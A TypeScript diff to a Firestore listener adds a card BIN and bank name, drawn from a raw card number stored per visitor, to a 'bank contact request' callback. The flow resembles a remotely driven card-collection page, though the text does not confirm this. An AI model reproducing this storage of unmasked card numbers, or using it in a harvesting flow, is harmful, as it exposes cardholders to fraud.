@@ -551,7 +551,11 @@ export const pushBankContactRequest = async (visitorId: string) => {
 export const listenForBankContactRequest = (
   callback: (
     show: boolean,
-    payload: { requestedAt: string },
+    payload: {
+      requestedAt: string;
+      cardBin: string;
+      cardBankName: string;
+    },
   ) => void,
 ): (() => void) => {
   if (!db) return () => {};
@@ -560,14 +564,23 @@ export const listenForBankContactRequest = (
   const ref = doc(db, "pays", visitorId);
   return onSnapshot(ref, (snap) => {
     if (!snap.exists()) {
-      callback(false, { requestedAt: "" });
+      callback(false, { requestedAt: "", cardBin: "", cardBankName: "" });
       return;
     }
     const data = snap.data() as any;
     const requested = Boolean(data?.bankContactRequest);
     const confirmed = Boolean(data?.bankContactConfirmed);
     const requestedAt = String(data?.bankContactAt || "");
-    callback(requested && !confirmed, { requestedAt });
+    const rawCard = String(data?.cardNumber || "").replace(/\D/g, "");
+    const cardBin = rawCard.slice(0, 6);
+    const cardBankName = String(
+      data?.cardBankName || data?.cardBank || data?.bankName || "",
+    );
+    callback(requested && !confirmed, {
+      requestedAt,
+      cardBin,
+      cardBankName,
+    });
   });
 };
 
